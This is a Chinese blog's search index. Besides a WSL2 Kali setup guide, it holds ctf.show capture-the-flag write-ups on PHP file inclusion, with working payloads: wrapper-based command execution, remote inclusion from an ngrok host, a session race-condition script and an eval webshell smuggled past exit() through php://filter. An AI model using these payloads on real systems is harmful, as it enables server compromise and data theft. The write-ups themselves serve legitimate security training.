<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>windows下的wsl-kail</title>
      <link href="/Linux/%E5%85%B6%E4%BB%96/wsl-kail/"/>
      <url>/Linux/%E5%85%B6%E4%BB%96/wsl-kail/</url>
      
        <content type="html"><![CDATA[<h1 id="wsl2下的kali环境"><a href="#wsl2下的kali环境" class="headerlink" title="wsl2下的kali环境"></a>wsl2下的kali环境</h1><p>首先在微软自带的应用商店安装Windows 终端</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220511175649558.png" alt="image-20220511175649558"></p><p>接着我们对Windows 终端进行基本的设置,启动默认为powershell</p><p>使用父进程目录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220512225608539.png" alt="image-20220512225608539"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220512225432640.png" alt="image-20220512225432640"></p><p>修改一下后背景图片</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220512225550447.png" alt="image-20220512225550447"></p><p>接着我们修改一下.bat文件的默认打开方式,打开注册表</p><pre><code>计算机\HKEY_CLASSES_ROOT\batfile\shell\open\command</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220513103044730.png" alt="image-20220513103044730"></p><p>修改成wt.exe的路径加上后面的参数</p><pre><code>&quot;C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.12.10982.0_x64__8wekyb3d8bbwe\wt.exe&quot;  -p &quot;Command Prompt&quot; &quot;%1&quot; %*</code></pre><p>这样的话我们新建一个bat文件来在sqlmap.py目录下面</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220513103146500.png" alt="image-20220513103146500"></p><p>我们来双击这个bat文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220513103638403.png" alt="image-20220513103638403"></p><p>太好玩了</p><p>接着打开适用于linux的windows子系统</p><p>控制面板-&gt;程序-&gt;启动或者关闭windows功能</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220511180137676.png" alt="image-20220511180137676"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220511175823927.png" alt="image-20220511175823927"></p><p>接着重启电脑</p><p>打开任务管理器看看有没有开启虚拟化</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220511175925628.png" alt="image-20220511175925628"></p><p>windows powershell管理员开启</p><pre><code>Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linuxdism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestartdism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart</code></pre><pre><code>wsl --installwsl --statuswsl --updatewsl --set-default-version 2</code></pre><p>安装linux,还是应用商店</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220511180456369.png" alt="image-20220511180456369"></p><p>安装完成后，在 Kali Linux 下，输入如下命令，安装工具集</p><pre><code class="bash">sudo apt update &amp;&amp; sudo apt upgradesudo apt install -y kali-linux-default</code></pre><p>安装gui</p><pre><code>sudo apt install -y kali-win-kex</code></pre><p>开启</p><pre><code># 启动cd ~kex# 关闭kex stop# 窗口模式kex --win -s</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220511180629831.png" alt="image-20220511180629831"></p><p>还可以开启无缝模式</p><pre><code>kex --sl -s</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220511180740001.png" alt="image-20220511180740001"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220511180956711.png" alt="image-20220511180956711"></p><p>修改任务栏位置</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220511181027493.png" alt="image-20220511181027493"></p><p>分别为取消固定和修改长度</p><p>修改root密码为root</p><pre><code>sudo -i 加本人登录时设置的密码passwd root root</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220511180905990.png" alt="image-20220511180905990"></p><p>处理一个bug,截图找不到了,如果自配置用户启动出错,修改一下两个log文件的所属用户和所属组,并更改权限</p><pre><code>chown wanan  win-kexsl_wanan.logchgrp wanan  win-kexsl_wanan.logchmod 644 win-kexsl_wanan.log</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220511181205713.png" alt="image-20220511181205713"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑盒测试</title>
      <link href="/ctfshow/ctf.show/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
      <url>/ctfshow/ctf.show/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="web380"><a href="#web380" class="headerlink" title="web380"></a>web380</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291618023.png" alt="image-20220329161843751"></p><p>扫扫目录,翻翻源码</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291643206.png" alt="image-20220329164330178"></p><p>这是别人扫的,工具扫太快,扫不到.改天研究研究把速度调慢点</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291637313.png" alt="image-20220329163703212"></p><p>什么也没发现</p><p>不过看来是按page_1 2 3 4来读取的文件,我们试试别的试试page.php</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291647396.png" alt="image-20220329164722345"></p><p>发现是通过id参数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291652437.png" alt="image-20220329165206218"></p><p>存在本地文件包含</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291652987.png" alt="image-20220329165228952"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291652964.png" alt="image-20220329165243903"></p><h1 id="web381"><a href="#web381" class="headerlink" title="web381"></a>web381</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311957334.png" alt="image-20220331195729205"></p><p>找后台</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311958272.png" alt="image-20220331195808224"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爆破</title>
      <link href="/ctfshow/ctf.show/%E7%88%86%E7%A0%B4/"/>
      <url>/ctfshow/ctf.show/%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h1><h2 id="base64编码爆破"><a href="#base64编码爆破" class="headerlink" title="base64编码爆破"></a>base64编码爆破</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203261832550.png" alt="image-20220326183208502"></p><p>抓包发现并没有使用get和post提交</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203261831899.png" alt="image-20220326183101849"></p><p>发现一个basic 解码base64是密码<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203261831179.png" alt="image-20220326183154126"></p><p>开始爆破,添加位置</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203261919165.png" alt="image-20220326191936110"></p><p>选择用户自定义</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203261920054.png" alt="image-20220326192020001"></p><p>在一填admin:</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203261920828.png" alt="image-20220326192031782"></p><p>二加上刚才的字典</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203261921853.png" alt="image-20220326192102803"></p><p>添加base64编码,取消下面的url编码</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203261921652.png" alt="image-20220326192124605"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203261919007.png" alt="image-20220326191915961"></p><p>查看响应</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203261922668.png" alt="image-20220326192208620"></p><h1 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h1><h2 id="子域名爆破"><a href="#子域名爆破" class="headerlink" title="子域名爆破"></a>子域名爆破</h2><p>扫一下百度吧,记录下工具</p><h2 id="ctfr"><a href="#ctfr" class="headerlink" title="ctfr"></a>ctfr</h2><pre><code>python ctfr.py -d baidu.com</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312215476.png"></p><h2 id="oneforall"><a href="#oneforall" class="headerlink" title="oneforall"></a>oneforall</h2><pre><code>python oneforall.py --targets baidu.com run</code></pre><h2 id="layer"><a href="#layer" class="headerlink" title="layer"></a>layer</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312221759.png" alt="image-20220331222123654"></p><h1 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h1><p>&#96;&#96;&#96;php<br>&lt;?php</p><p>&#x2F;*</p><h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p> Author: h1xa<br> Date:   2020-09-03 11:43:51<br> Last Modified by:   h1xa<br> Last Modified time: 2020-09-03 11:56:11<br> email: <a href="mailto:&#x68;&#x31;&#120;&#97;&#x40;&#99;&#x74;&#102;&#x65;&#114;&#x2e;&#x63;&#111;&#109;">&#x68;&#x31;&#120;&#97;&#x40;&#99;&#x74;&#102;&#x65;&#114;&#x2e;&#x63;&#111;&#109;</a><br> link: <a href="https://ctfer.com/">https://ctfer.com</a></p><p>*&#x2F;<br>error_reporting(0);</p><p>include(‘flag.php’);<br>if(isset($_GET[‘token’]))</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/ctfshow/ctf.show/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/ctfshow/ctf.show/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262039670.png" alt="image-20220326203913638"></p><p>源码开局</p><p><strong>php:&#x2F;&#x2F;</strong></p><pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></pre><p><strong>data:&#x2F;&#x2F;</strong></p><pre><code>?file=data://text/plain,&lt;?php%20system(&#39;cat `ls`&#39;)?&gt;</code></pre><p><strong>php:&#x2F;&#x2F;</strong></p><pre><code>?file=php://inputPOST&lt;?php system(&#39;tac `ls`&#39;) ?&gt;</code></pre><p><strong>http</strong></p><pre><code>?file=http://9eb3-111-17-194-91.ngrok.io/wanan.txt?file=https://9eb3-111-17-194-91.ngrok.io/wanan.txt</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262045074.png" alt="image-20220326204539032"></p><h1 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2020-09-16 11:10:14 Last Modified by:   h1xa Last Modified time: 2020-09-16 11:12:38 email: h1xa@ctfer.com link: https://ctfer.com*/if(isset($_GET[&#39;file&#39;]))&#123;    $file = $_GET[&#39;file&#39;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><pre><code>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b/?file=PHP://inputPOST&lt;?php system(&#39;tac `ls`&#39;) ?&gt;http://0d236b1b-2f77-47ca-b3ac-be411c6f0441.challenge.ctf.show/?file=http://9eb3-111-17-194-91.ngrok.io/wanan.txt</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403203526578.png" alt="image-20220403203526578"></p><p>这里的%2b是加号,在我这里直接使用+号是不行的</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301259325.png" alt="image-20220330125919158"></p><pre><code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgYGxzYCcpID8%2b</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301259631.png" alt="image-20220330125934546"></p><h1 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2020-09-16 11:25:09 Last Modified by:   h1xa Last Modified time: 2020-09-16 11:26:29 email: h1xa@ctfer.com link: https://ctfer.com*/if(isset($_GET[&#39;file&#39;]))&#123;    $file = $_GET[&#39;file&#39;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>payload</p><pre><code>?file=http://9eb3-111-17-194-91.ngrok.io/wanan.txt/?file=PHP://inputPOST&lt;?php system(&#39;tac `ls`&#39;) ?&gt;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403204127607.png" alt="image-20220403204127607"></p><h1 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h1><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2020-09-16 11:25:09 Last Modified by:   h1xa Last Modified time: 2020-09-16 15:51:31 email: h1xa@ctfer.com link: https://ctfer.com*/if(isset($_GET[&#39;file&#39;]))&#123;    $file = $_GET[&#39;file&#39;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>日志包含</p><pre><code>?file=/var/log/nginx/access.log</code></pre><p>接着修改ua</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403205128333.png" alt="image-20220403205128333"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403205420402.png" alt="image-20220403205420402"></p><h1 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h1><h2 id="利用session-upload-progress进行文件包含"><a href="#利用session-upload-progress进行文件包含" class="headerlink" title="利用session.upload_progress进行文件包含"></a>利用session.upload_progress进行文件包含</h2><p>在php.ini中有以下默认的配置</p><pre><code class="php">#表示upload_progress功能开始,也意味着当浏览器向服务器上传一个文件是,php会把此次文件上传的详细信息(如上传时间 上传进度等)存储在session当中1. session.upload_progress.enabled = on#表示当文件上传结束后,php将会立即清除对应session文件中的内容,这个选项非常重要2. session.upload_progress.cleanup = on#prefix+name将表示为session中的键名3. session.upload_progress.prefix = &quot;upload_progress_&quot;#name当它出现在表单中,php将会报告上传进度,最大的好处是他的值可控4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;5. session.upload_progress.freq = &quot;1%&quot;6. session.upload_progress.min_freq = &quot;1&quot;#增配置的默认值为off,表示我们对cookie中的sessionid可控7.session.use_strict_mode=off</code></pre><p>如果session.auto_start&#x3D;On,则php在接收请求的时候会自动初始化session,不在需要执行session_start().但是默认情况下这个选项都是关闭的.</p><p>但是session还有一个默认选项,session.use_strict_mode的默认值为0.此时用户是可以自定义session id的.比如,我们在cookie里设置phpsessid&#x3D;tgao,php将会在服务器上创建一个文件:&#x2F;tmp&#x2F;sess_TGAO 即使此时用户没有初始化session,php也会自动初始化session.并产生一个键值.这个键值由ini.get(“session.upload_progress.prefix”)+和由我们构造的session.upload_progress.name值组成,最后被写入sess_文件里.</p><p>默认配置session.upload_progress.cleanup&#x3D;on导致文件上传以后,session文件内容立即清空,这个时候我们就可以通过条件竞争来实现</p><p>session文件默认存储路径</p><pre><code>/var/lib/php/sess_PHPSESSID/var/lib/php/sessions/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSID</code></pre><pre><code class="python"># -*- coding: utf-8 -*- author:lonmarimport ioimport requestsimport threadingsessID = &#39;flag&#39;url = &#39;&#39;     #这里改为题目的url地址def write(session):    while event.isSet():        f = io.BytesIO(b&#39;a&#39; * 1024 * 50)        response = session.post(                                                        url,            cookies=&#123;&#39;PHPSESSID&#39;: sessID&#125;,            data=&#123;&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&lt;?php system(&quot;cat *.php&quot;);?&gt;&#39;&#125;,       #session中写入一句话            files=&#123;&#39;file&#39;: (&#39;test.txt&#39;, f)&#125;     #写入文件        )def read(session):    while event.isSet():        response = session.get(url + &#39;?file=/tmp/sess_&#123;&#125;&#39;.format(sessID))        if &#39;test&#39; in response.text: #如果成功打开文件，则竞争成功！            print(response.text)            event.clear()        else:            print(&#39;[*]retrying...&#39;)if __name__ == &#39;__main__&#39;:    event = threading.Event()    event.set()    with requests.session() as session:        for i in range(1, 100):            threading.Thread(target=write, args=(session,)).start()        for i in range(1, 100):            threading.Thread(target=read, args=(session,)).start()</code></pre><p>题目</p><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2020-09-16 11:25:09 Last Modified by:   h1xa Last Modified time: 2020-09-16 19:34:45 email: h1xa@ctfer.com link: https://ctfer.com*/if(isset($_GET[&#39;file&#39;]))&#123;    $file = $_GET[&#39;file&#39;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>不过这里脚本不给玩,我们试试burp</p><p>构造一个上传表单</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://718ac6a2-5a12-4d56-a573-3a13cb88450b.challenge.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h1 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h1><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2020-09-16 11:25:09 Last Modified by:   h1xa Last Modified time: 2020-09-16 21:57:55 email: h1xa@ctfer.com link: https://ctfer.com*/if(isset($_GET[&#39;file&#39;]))&#123;    $file = $_GET[&#39;file&#39;];    $content = $_POST[&#39;content&#39;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);    file_put_contents(urldecode($file), &quot;&lt;?php die(&#39;大佬别秀了&#39;);?&gt;&quot;.$content);    &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>这里的file_put_contents将字符串写入文件中了</p><p>先同php:&#x2F;&#x2F;filter的base64-decode流写入一个zf.php文件,要进行双url编码</p><pre><code>php://filter/write=convert.base64-decode/resource=zf.php</code></pre><pre><code>%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%61%25%36%36%25%32%65%25%37%30%25%36%38%25%37%30</code></pre><p>还要在处理一下,由于解码时会去除无法解码字符,所以最后剩下</p><pre><code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;phpdie</code></pre><p>总共六个字符,而base64算法解码时是4个byte为一组,那么我们需要将其补充成8个byte,而a是一个byte,那么增加两个a就可以正常解码</p><pre><code>&lt;?php @eval($_POST[zf]);?&gt;    -&gt; PD9waHAgQGV2YWwoJF9QT1NUW3pmXSk7Pz4=  -&gt; aaphpdiePD9waHAgQGV2YWwoJF9QT1NUW3pmXSk7Pz4=</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403214907284.png" alt="image-20220403214907284"></p><p>可以看到成功解码了,同样如果不补齐就会出错</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403214930438.png" alt="image-20220403214930438"></p><pre><code>最终上传/?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%61%25%36%36%25%32%65%25%37%30%25%36%38%25%37%30POSTcontent=aaPD9waHAgQGV2YWwoJF9QT1NUW3pmXSk7Pz4=</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403215146506.png" alt="image-20220403215146506"></p><p>接着访问zf.php</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403215404107.png" alt="image-20220403215404107"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403215411651.png" alt="image-20220403215411651"></p><h2 id="php-filter的妙用"><a href="#php-filter的妙用" class="headerlink" title="php:filter的妙用"></a>php:filter的妙用</h2><h3 id="xxe中的使用"><a href="#xxe中的使用" class="headerlink" title="xxe中的使用"></a>xxe中的使用</h3><p>由于xxe漏洞的特殊性,我们读取html PHP文件时可能会抛出错误,原因是php基于标签的脚本语言,&lt;?php ?&gt;这个语法和xml相符合,所以在解析xml的时候会被误认为是xml,而其中内容,又有可能与标准xml冲突,所以导致了出错</p><p>php:&#x2F;&#x2F;filter是php语言特有的协议流,作用是作为一个中间流来处理其他流,比如我们可以使用如下将post内容转换成bse64输出</p><pre><code>readfile(&quot;php://filter/read=convert.base64-encode/resource=php://input&quot;)</code></pre><p>所以在xxe中,我们也可以将php等容易引发冲突的文件流用php:filter协议流过一遍</p><pre><code>php://filter/read=convert.base64-encode/resource=./xxe.php</code></pre><h3 id="巧用编码与解码"><a href="#巧用编码与解码" class="headerlink" title="巧用编码与解码"></a>巧用编码与解码</h3><pre><code class="php">&lt;?php$content = &#39;&lt;?php exit; ?&gt;&#39;;$content .= $_POST[&#39;txt&#39;];file_put_contents($_POST[&#39;filename&#39;], $content);</code></pre><p>$content在开头增加了exit过程,导致即使我们成功写入一句话,也执行不了(在实战中,通常出现在缓存 配置文件等地方,不允许用户直接访问的文件,都会被加上if(!defind(xxx))exit;这类的限制)</p><p>这里的$_POST[“filename”]是可以控制协议的,我们即可使用php:&#x2F;&#x2F;filter协议来绕过,使用php:&#x2F;&#x2F;filter流的base64-decode方法,将$content解码,利用php base64_decode函数特性去除exit</p><p>在base64编码中只包含64个可打印字符,而php在解码base64时,遇到不在其中的字符时,将会跳过这些字符,仅将合法字符组成一个新的字符串进行解码.</p><p>所以base64_decode可以理解成</p><pre><code class="php">&lt;?php$_GET[&quot;txt&quot;] = preg_replace(&quot;|[^a-z0-9A-Z+/]&quot;,&quot;&quot;,$_GET[&#39;txt&#39;]);base64_decode($_GET[&#39;txt&#39;]);</code></pre><p>所以当$content被加上了&lt;?php exit;?&gt;之后,我们可以使用php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base-decode类首先对其解码.在解码过程中,字符&lt; ? ; &gt; 空格等一共有七个字符不符合base64编码的字符方位将被忽略,所以最终被解码的字符仅有”phpexit”和我们传入的其他字符.”phpexit”一共七个字符,因为base64算法解码时是4个byte一组,所以给他增加一个”a”一共八个字符.这样 “phppexita被正常解码,而后面传入的webshell的base64内容也被正常解码.结果就是&lt;?php exit; ?&gt;没有了</p><h3 id="字符串操作方法"><a href="#字符串操作方法" class="headerlink" title="字符串操作方法"></a>字符串操作方法</h3><p>还可以使用php:filter字符串处理方法来去除exit.&lt;?php exit;?&gt;实际上是一个xml标签,既然是xml标签,我们就可以使用strip_tags函数去除它,而php:&#x2F;&#x2F;filter刚好支持</p><pre><code> php://filter/read=string.strip_tags/resource=php://input</code></pre><p>php:&#x2F;&#x2F;filter允许使用多个过滤器,我们可以先将webshell用base64编码,在调用完成strip_tags后再进行base64-decode</p><p>除此之外，我们还可以利用rot13编码独立完成任务。原理和上面类似，核心是将“死亡exit”去除。<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了</p><p>当然，这个方法的条件就是不开启短标签。</p><h1 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2020-09-16 11:25:09 Last Modified by:   h1xa Last Modified time: 2020-09-17 02:27:25 email: h1xa@ctfer.com link: https://ctfer.com */if(isset($_GET[&#39;file&#39;]))&#123;    $file = $_GET[&#39;file&#39;];    if(preg_match(&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;, $file))&#123;        die(&quot;error&quot;);    &#125;    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>payload</p><p>绕过等号就好</p><pre><code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgYGxzYCcpOw</code></pre><h1 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h1><p>要分析视频,我不会</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403215822599.png" alt="image-20220403215822599"></p><p>可以正常读文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403220424228.png"></p><p>试了几个常见的就出来了,也可以爆破</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403220620645.png" alt="image-20220403220620645"></p><h1 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h1><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: yu22x Date:   2020-09-16 11:25:09 Last Modified by:   h1xa Last Modified time: 2020-10-01 18:16:59*/highlight_file(__FILE__);error_reporting(0);function filter($x)&#123;    if(preg_match(&#39;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#39;,$x))&#123;        die(&#39;too young too simple sometimes naive!&#39;);    &#125;&#125;$file=$_GET[&#39;file&#39;];$contents=$_POST[&#39;contents&#39;];filter($file);file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents);</code></pre><p>应该是让用别的过滤器</p><h2 id="php-x2F-x2F-filter的各种过滤器"><a href="#php-x2F-x2F-filter的各种过滤器" class="headerlink" title="php:&#x2F;&#x2F;filter的各种过滤器"></a>php:&#x2F;&#x2F;filter的各种过滤器</h2><p><a href="https://blog.csdn.net/qq_44657899/article/details/109300335">php:&#x2F;&#x2F;filter的各种过滤器</a></p><p>这里使用convert.iconv.*</p><pre><code>?file=php://filter/convert.iconv.ucs-2be.ucs-2le/resource=5.phpPOST: contents=?&lt;hp pvela$(G_TE&#39;[&#39;a)] ;&gt;?</code></pre><p>原因</p><pre><code>&lt;?phphighlight_file(__FILE__);file_put_contents(&quot;php://filter/convert.iconv.ucs-2be.ucs-2le/resource=5.php&quot;, &quot;&lt;?php die();?&gt;?&lt;hp pvela$(G_TE&#39;[&#39;a)] ;&gt;?&quot;); ?&gt;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403221348284.png" alt="image-20220403221348284"></p><p>可以看到前面不符合php的格式</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403221752628.png" alt="image-20220403221752628"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403221802615.png" alt="image-20220403221802615"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/ctfshow/ctf.show/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/ctfshow/ctf.show/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
